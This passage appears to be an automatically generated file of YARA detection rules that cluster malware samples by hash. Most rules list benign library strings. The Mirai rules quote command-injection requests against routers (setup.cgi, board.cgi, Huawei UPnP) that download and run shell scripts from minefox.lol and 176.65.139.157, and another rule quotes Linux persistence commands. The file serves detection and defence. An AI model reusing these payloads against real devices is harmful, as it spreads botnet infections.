        $s0 = "/var/tmp/%s\\nRestart=on-failure\\nRestartSec=30\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/syst" ascii
        $s1 = "printf '[Unit]\\nDescription=System Service\\nAfter=network.target\\n[Service]\\nType=simple\\nExecStart=" ascii
        $s2 = "echo '0' > /proc/sys/kernel/pid_max 2>/dev/null" ascii
        $s3 = "crontab -l 2>/dev/null | grep -v '%s' | crontab - 2>/dev/null" ascii
        $s4 = "find /tmp /var/tmp /dev/shm /root -name '*%s*' -delete 2>/dev/null" ascii
        $s5 = "chmod +x /var/tmp/%s /usr/lib/%s 2>/dev/null" ascii
        $s6 = "systemctl daemon-reload 2>/dev/null; systemctl enable %s 2>/dev/null" ascii
        $s7 = "rm -f /lib/systemd/system/%s.service 2>/dev/null" ascii
        $s8 = "systemctl stop %s 2>/dev/null; systemctl disable %s 2>/dev/null" ascii
        $s9 = "sed -i '/%s/d' /etc/rc.local 2>/dev/null" ascii
        $s10 = "rm -f /etc/systemd/system/%s.service 2>/dev/null" ascii
        $s11 = "chattr +i /var/tmp/%s 2>/dev/null" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_b5a9528d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-b5a9528d"
        date = "2026-10-15"
        campaign = "imphash-b5a9528d"
        family = ""
        hash = "22822b1a649484aceee0817ad14b4c513cb544d0a2f60be63b9bfb6453421c66"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-b5a9528d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "command line encoding conversion failure" ascii
        $s1 = "OpenJDK Platform 21.0.12" wide
        $s2 = "Windows original main args:" ascii
        $s3 = "OpenJDK Platform binary" wide
        $s4 = "http://www.eclipse.org/0" ascii
        $s5 = "JLI_InitArgProcessing" ascii
        $s6 = "Eclipse Foundation0" ascii
        $s7 = "Eclipse Foundation1" ascii
        $s8 = "_JAVA_LAUNCHER_DEBUG" ascii
        $s9 = "Eclipse Adoptium" wide
        $s10 = "JLI_GetStdArgc" ascii
        $s11 = "JLI_GetStdArgs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_rich_header_hash_c60fce65_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-c60fce65"
        date = "2026-10-15"
        campaign = "rich_header_hash-c60fce65"
        family = ""
        hash = "22822b1a649484aceee0817ad14b4c513cb544d0a2f60be63b9bfb6453421c66"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-c60fce65.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "command line encoding conversion failure" ascii
        $s1 = "OpenJDK Platform 21.0.12" wide
        $s2 = "Windows original main args:" ascii
        $s3 = "OpenJDK Platform binary" wide
        $s4 = "http://www.eclipse.org/0" ascii
        $s5 = "JLI_InitArgProcessing" ascii
        $s6 = "Eclipse Foundation0" ascii
        $s7 = "Eclipse Foundation1" ascii
        $s8 = "_JAVA_LAUNCHER_DEBUG" ascii
        $s9 = "Eclipse Adoptium" wide
        $s10 = "JLI_GetStdArgc" ascii
        $s11 = "JLI_GetStdArgs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_a468d366_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a468d366"
        date = "2026-10-15"
        campaign = "tlsh-a468d366"
        family = ""
        hash = "22822b1a649484aceee0817ad14b4c513cb544d0a2f60be63b9bfb6453421c66"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a468d366.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "command line encoding conversion failure" ascii
        $s1 = "OpenJDK Platform 21.0.12" wide
        $s2 = "Windows original main args:" ascii
        $s3 = "OpenJDK Platform binary" wide
        $s4 = "http://www.eclipse.org/0" ascii
        $s5 = "JLI_InitArgProcessing" ascii
        $s6 = "Eclipse Foundation0" ascii
        $s7 = "Eclipse Foundation1" ascii
        $s8 = "_JAVA_LAUNCHER_DEBUG" ascii
        $s9 = "Eclipse Adoptium" wide
        $s10 = "JLI_GetStdArgc" ascii
        $s11 = "JLI_GetStdArgs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_rich_header_hash_0fc4db97_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-0fc4db97"
        date = "2026-10-15"
        campaign = "rich_header_hash-0fc4db97"
        family = ""
        hash = "1bc82bed6143d2bf1b6b08a7809f4a5e29317d6fddd338a7da3c0223522e4bbf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-0fc4db97.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "10.0.26100.1742 (WinBuild.160101.0800)" wide
        $s1 = "ApiSet Stub DLL" wide
        $s2 = "apisetstub" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 3 of them
}

rule Sightlines_tlsh_f188ab3c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f188ab3c"
        date = "2026-10-15"
        campaign = "tlsh-f188ab3c"
        family = ""
        hash = "17d63275d00bdd8670422b95bd264c532998e0a1b041079e54fce4b6b7a55819"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f188ab3c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "10.0.26100.1742 (WinBuild.160101.0800)" wide
        $s1 = "ApiSet Stub DLL" wide
        $s2 = "apisetstub" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 3 of them
}

rule Sightlines_signer_cert_sha1_c1367230_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-c1367230"
        date = "2026-10-15"
        campaign = "signer_cert_sha1-c1367230"
        family = ""
        hash = "4ad565a8ba3ef0ea8ab87221ad11f83ee0bc844ce236607958406663b407333e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-c1367230.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "10.0.26100.1742 (WinBuild.160101.0800)" wide
        $s1 = "ApiSet Stub DLL" wide
        $s2 = "241016195111Z0t1" ascii
        $s3 = "230865+5016550" ascii
        $s4 = "231019195111Z" ascii
        $s5 = "apisetstub" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 6 of them
}

rule Sightlines_host_6eaff849_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-6eaff849"
        date = "2026-10-15"
        campaign = "host-6eaff849"
        family = "mirai"
        hash = "00d0db4d3dbc46ce64f493b6d0df48a2c8e3b2c4c514a1f5159b8d2c8828cb8f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-6eaff849.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=\";cd /tmp;wget http://minefox.lol/bins/" ascii
        $s1 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s2 = "mig.sh http://$H/bins/kla.sh 2>/dev/null ||    busybox wget -q -O .mig.sh http://$H/bins/kla.sh 2>/d" ascii
        $s3 = "cd /tmp; wget http://minefox.lol/bins/kla.sh -O k 2>/dev/null; chmod +x k 2>/dev/null; ./k" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s5 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s6 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s7 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s8 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s9 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s10 = "en sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null" ascii
        $s11 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_7e5a8b6f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-7e5a8b6f"
        date = "2026-10-15"
        campaign = "imphash-7e5a8b6f"
        family = ""
        hash = "8b5eba6961642074384f1fbaa1f936cfbc3a5426df129ca85354243bfde048bb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-7e5a8b6f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Invalid value for PYTHONUTF8=%s; disabling utf-8 mode!" ascii
        $s1 = "  <assemblyIdentity type=\"win32\" name=\"Built.exe\" processorArchitecture=\"amd64\" version=\"1.0.0.0\"/>" ascii
        $s2 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" language=\"*\" processor" ascii
        $s3 = "Failed to get address for PyObject_CallFunctionObjArgs" ascii
        $s4 = "LOADER: Failed to set the TMP environment variable." ascii
        $s5 = "LOADER: Failed to convert runtime-tmpdir to a wide string." ascii
        $s6 = "Failed to get address for PyMarshal_ReadObjectFromString" ascii
        $s7 = "LOADER: Failed to expand environment variables in the runtime-tmpdir." ascii
        $s8 = "PyInstallem: pyi_win32_utils_to_utf8 failed." ascii
        $s9 = "Reported length (%d) of DLL name (%s) length exceeds buffer[%d] space" ascii
        $s10 = "WARNING: file already exists but should not: %s" ascii
        $s11 = "Cannot allocate memory for ARCHIVE_STATUS" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 12662072 and 12 of them
}

rule Sightlines_tlsh_09dd0e67_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-09dd0e67"
        date = "2026-10-15"
        campaign = "tlsh-09dd0e67"
        family = ""
        hash = "8b5eba6961642074384f1fbaa1f936cfbc3a5426df129ca85354243bfde048bb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-09dd0e67.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Invalid value for PYTHONUTF8=%s; disabling utf-8 mode!" ascii
        $s1 = "  <assemblyIdentity type=\"win32\" name=\"Built.exe\" processorArchitecture=\"amd64\" version=\"1.0.0.0\"/>" ascii
        $s2 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" language=\"*\" processor" ascii
        $s3 = "Failed to get address for PyObject_CallFunctionObjArgs" ascii
        $s4 = "LOADER: Failed to set the TMP environment variable." ascii
        $s5 = "LOADER: Failed to convert runtime-tmpdir to a wide string." ascii
        $s6 = "Failed to get address for PyMarshal_ReadObjectFromString" ascii
        $s7 = "LOADER: Failed to expand environment variables in the runtime-tmpdir." ascii
        $s8 = "PyInstallem: pyi_win32_utils_to_utf8 failed." ascii
        $s9 = "Reported length (%d) of DLL name (%s) length exceeds buffer[%d] space" ascii
        $s10 = "WARNING: file already exists but should not: %s" ascii
        $s11 = "Cannot allocate memory for ARCHIVE_STATUS" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 12662072 and 12 of them
}

rule Sightlines_tlsh_6b772e69_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6b772e69"
        date = "2026-10-15"
        campaign = "tlsh-6b772e69"
        family = "mirai"
        hash = "a4108bc5a04f98e70f087bd983c60b85ea0afc53f6bad9902354830f078ee7ef"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6b772e69.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/etc/config/resolv.conf" ascii
        $s1 = "Unknown error Success" ascii
        $s2 = "/etc/config/hosts" ascii
        $s3 = "D @N^NuNV" ascii
        $s4 = "L @N^NuNV" ascii
        $s5 = "j @N^NuNV" ascii
        $s6 = "/usr/lib/" ascii
        $s7 = " @N^NuNuNV" ascii
        $s8 = "$_N^NuNuNV" ascii
        $s9 = " OHWHQHy" ascii
        $s10 = "$N^NuNuNV" ascii
        $s11 = "0N^NuNuNV" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_d2bf224b_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d2bf224b"
        date = "2026-10-15"
        campaign = "tlsh-d2bf224b"
        family = "mirai"
        hash = "35b3c0f85872047ee77e8542e73d9b21e498d3a494ca33624672620eb70e9f06"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d2bf224b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ce:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -q -O /tmp/huawei 'http://176.65.139.157/te" ascii
        $s1 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-ins" ascii
        $s2 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://176.65.139.157/wawan." ascii
        $s3 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><u:SetNTPServers xm" ascii
        $s4 = "lnet.sh'; sh /tmp/huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgra" ascii
        $s5 = "GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://176.65.139.157/telnet." ascii
        $s6 = "GET /cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://176.65.139.157/telnet.sh;${" ascii
        $s7 = "e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=" ascii
        $s8 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://176.65.139.157/wawan.sh+-O" ascii
        $s9 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://176.65.139.157/telnet.sh;sh+/tmp/vacron" ascii
        $s10 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" S" ascii
        $s11 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://176.65.139.157/telnet.sh;sh+/tmp/awsec2" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1062152 and 12 of them
}

rule Sightlines_tlsh_55d38a5e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-55d38a5e"
        date = "2026-10-15"
        campaign = "tlsh-55d38a5e"
        family = ""
        hash = "2dc4cd857195e02522a9a4c666c69c263517ded672775911241bdcb39af36b5a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-55d38a5e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "knownArmAmdGcnAarch64AsmjsAvrBpfebBpfelHexagonX86_32M68kLoongArch64Mips32Mips64Msp430Nvptx64Pulley32" ascii
        $s1 = "HelloExtensionWrongGroupForKeyShareUnsolicitedEchExtensionAES_128_GCMAES_256_GCMCHACHA20_POLY_1305EX" ascii
        $s2 = "SizeLimitExhaustedInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7" ascii
        $s3 = "StringLinkerNoteMetadataElfCompilationLinkageDynamicAarch64_Ilp32BpfCskyE2K32E2K64I386X86_64_X32Mips" ascii
        $s4 = "PskKeyExchangeModeHpkeSymmetricCipherSuitekdf_idaead_idWebPkiSupportedAlgorithms { all: [ .. ], mapp" ascii
        $s5 = "CritEdgeSSABBBranchEntryLiveinDisallowedBranchArgTooManyLiveRegsU6x0x1x2x3x4x5x6x7x8x9x10x11x12x13x1" ascii
        $s6 = "vmctxassertion failed: !(res.read_bit(BIT_LITTLE_ENDIAN) && res.read_bit(BIT_BIG_ENDIAN))" ascii
        $s7 = "assertion failed: max <= MAX_LOWERED_TYPES" ascii
        $s8 = "GenericX86SignedX86RipRelativeX86RipRelativeMovqX86BranchS390xDblAArch64CallLoongArchBranchSharcType" ascii
        $s9 = "rowSwitchI64Add128I64Sub128I64MulWideSI64MulWideUAcqRelSeqCstEngineModuleRecGroupModuleInternedTypeI" ascii
        $s10 = "iCudaCygwinDarwinDragonflyEmscriptenEspidfFreebsdFuchsiaHaikuHermitHorizonHurdIllumosIOSL4reLinuxMac" ascii
        $s11 = "assertion failed: len >= size_of::<c::sockaddr_in>()_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 11484160 and 12 of them
}

rule Sightlines_imphash_61c19db5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-61c19db5"
        date = "2026-10-15"
        campaign = "imphash-61c19db5"
        family = ""
        hash = "a77e8d66cdd86e61cbea6772998e764be6078ec76c4c0b95f79a635815b18343"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-61c19db5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "knownArmAmdGcnAarch64AsmjsAvrBpfebBpfelHexagonX86_32M68kLoongArch64Mips32Mips64Msp430Nvptx64Pulley32" ascii
        $s1 = "HelloExtensionWrongGroupForKeyShareUnsolicitedEchExtensionAES_128_GCMAES_256_GCMCHACHA20_POLY_1305EX" ascii
        $s2 = "SizeLimitExhaustedInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7" ascii
        $s3 = "StringLinkerNoteMetadataElfCompilationLinkageDynamicAarch64_Ilp32BpfCskyE2K32E2K64I386X86_64_X32Mips" ascii
        $s4 = "PskKeyExchangeModeHpkeSymmetricCipherSuitekdf_idaead_idWebPkiSupportedAlgorithms { all: [ .. ], mapp" ascii
        $s5 = "CritEdgeSSABBBranchEntryLiveinDisallowedBranchArgTooManyLiveRegsU6x0x1x2x3x4x5x6x7x8x9x10x11x12x13x1" ascii
        $s6 = "vmctxassertion failed: !(res.read_bit(BIT_LITTLE_ENDIAN) && res.read_bit(BIT_BIG_ENDIAN))" ascii
        $s7 = "assertion failed: max <= MAX_LOWERED_TYPES" ascii
        $s8 = "GenericX86SignedX86RipRelativeX86RipRelativeMovqX86BranchS390xDblAArch64CallLoongArchBranchSharcType" ascii
        $s9 = "rowSwitchI64Add128I64Sub128I64MulWideSI64MulWideUAcqRelSeqCstEngineModuleRecGroupModuleInternedTypeI" ascii
        $s10 = "iCudaCygwinDarwinDragonflyEmscriptenEspidfFreebsdFuchsiaHaikuHermitHorizonHurdIllumosIOSL4reLinuxMac" ascii
        $s11 = "assertion failed: len >= size_of::<c::sockaddr_in>()_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 11484160 and 12 of them
}

rule Sightlines_tlsh_ff965ad2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ff965ad2"
        date = "2026-10-15"
        campaign = "tlsh-ff965ad2"
        family = ""
        hash = "24f1dfaa9847f556973ea2443051646a3e6adf8991b3ef5e193e9642d8efaa8b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ff965ad2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s6 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s7 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s8 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s9 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s10 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________alloc_____collections\\btree\\map\\entry.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 11 of them
}

rule Sightlines_imphash_0679974f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-0679974f"
        date = "2026-10-15"
        campaign = "imphash-0679974f"
        family = ""
        hash = "31397cce0531953d2c7c81d2d50ead0ea7629e57db9690613782f5ae3572c21a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-0679974f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R)@" ascii
        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s6 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s7 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s8 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s9 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s10 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________alloc_____collections\\btree\\map\\entry.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 11 of them
}

rule Sightlines_imphash_359e43ae_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-359e43ae"
        date = "2026-10-15"
        campaign = "imphash-359e43ae"
        family = ""
        hash = "1bd7ae6434c3908216ed4c65bf69f6635925e7535fe5ea5e302bd412709a675e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-359e43ae.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s6 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s7 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s8 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s9 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s10 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________alloc_____collections\\btree\\map\\entry.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_60866944_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-60866944"
        date = "2026-10-15"
        campaign = "imphash-60866944"
        family = ""
        hash = "24f1dfaa9847f556973ea2443051646a3e6adf8991b3ef5e193e9642d8efaa8b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-60866944.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "window size must be non-zero_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________core_____slice\\s" ascii
        $s5 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s6 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s7 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s8 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s9 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s10 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s11 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_1a7b68f8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-1a7b68f8"
        date = "2026-10-15"
        campaign = "imphash-1a7b68f8"
        family = ""
        hash = "1baf7623a5260704e4888cd50807e479accfde957be216af03cc840a58ee6ece"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-1a7b68f8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R7@" ascii
        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s6 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s7 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s8 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________core_____slice\\sort\\unstable\\quicksort.rs" ascii
        $s9 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s10 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s11 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_eb46fa9c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-eb46fa9c"
        date = "2026-10-15"
        campaign = "imphash-eb46fa9c"
        family = ""
        hash = "0572de7b9ebb2829b35c89e7ea1d18468a74623db86800bb5ba8e5b21b078f9b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-eb46fa9c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
